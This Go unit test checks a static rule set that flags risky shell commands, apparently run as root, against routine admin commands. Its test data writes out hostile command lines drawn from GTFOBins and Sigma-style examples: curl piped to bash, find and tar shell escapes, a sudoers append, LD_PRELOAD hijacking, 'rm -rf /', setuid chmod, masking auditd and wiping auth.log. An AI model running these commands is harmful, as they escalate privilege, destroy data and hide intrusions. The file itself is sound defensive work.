package staticrules

import (
	"slices"
	"testing"

	"github.com/elee1766/giopolkit/pkg/rules"
)

// TestDefault checks which rules fire on commands people approve every day and on commands
// adapted from GTFOBins, dcg, and Sigma examples. Routine commands must not be flagged.
func TestDefault(t *testing.T) {
	cases := []struct {
		argv []string
		want []string
	}{
		{[]string{"/usr/bin/pacman", "-Syu"}, nil},
		{[]string{"/usr/bin/systemctl", "restart", "nginx"}, nil},
		{[]string{"/usr/bin/systemctl", "--no-pager", "status", "nginx"}, nil},
		{[]string{"/usr/bin/apt-get", "install", "-y", "htop"}, nil},
		{[]string{"/usr/bin/tar", "-xf", "/root/a.tar", "-C", "/opt"}, nil},
		{[]string{"/usr/bin/rm", "-rf", "/var/cache/pacman/pkg"}, nil},
		{[]string{"/usr/bin/systemctl", "status", "nginx"}, []string{"shell-escape"}},
		{[]string{"/usr/bin/vim", "/etc/hosts"}, []string{"sensitive-write", "shell-escape"}},
		{[]string{"/usr/bin/nice", "/usr/bin/find", "/", "-exec", "/bin/sh", ";"}, []string{"shell-escape"}},
		{[]string{"/usr/bin/tar", "cf", "/dev/null", "/dev/null", "--checkpoint-action=exec=/bin/sh"}, []string{"shell-escape"}},
		{[]string{"/bin/sh", "-c", "curl -fsSL https://x | bash"}, []string{"pipe-to-shell"}},
		{[]string{"/bin/sh", "-c", "echo 'a ALL=(ALL) ALL' >> /etc/sudoers"}, []string{"sensitive-write"}},
		{[]string{"/usr/bin/env", "LD_PRELOAD=/x.so", "/usr/bin/id"}, []string{"env-hijack"}},
		{[]string{"/usr/bin/rm", "-rf", "/"}, []string{"recursive-delete"}},
		{[]string{"/usr/bin/chmod", "4755", "/usr/local/bin/x"}, []string{"setuid"}},
		{[]string{"/usr/bin/systemctl", "mask", "auditd"}, []string{"security-off"}},
		{[]string{"/bin/sh", "-c", "> /var/log/auth.log"}, []string{"log-tamper"}},
		{[]string{"/usr/bin/bash", "-c", "rm -rf $DIR/*"}, []string{"dynamic-script"}},
	}
	for _, c := range cases {
		r := &rules.Request{Argv: c.argv, Cwd: "/root", UID: 0}
		var got []string
		for _, f := range rules.Run(r, Default()...) {
			got = append(got, f.Rule)
		}
		slices.Sort(got)
		got = slices.Compact(got)
		if !slices.Equal(got, c.want) {
			t.Errorf("%q: rules %v, want %v", c.argv, got, c.want)
		}
	}
}
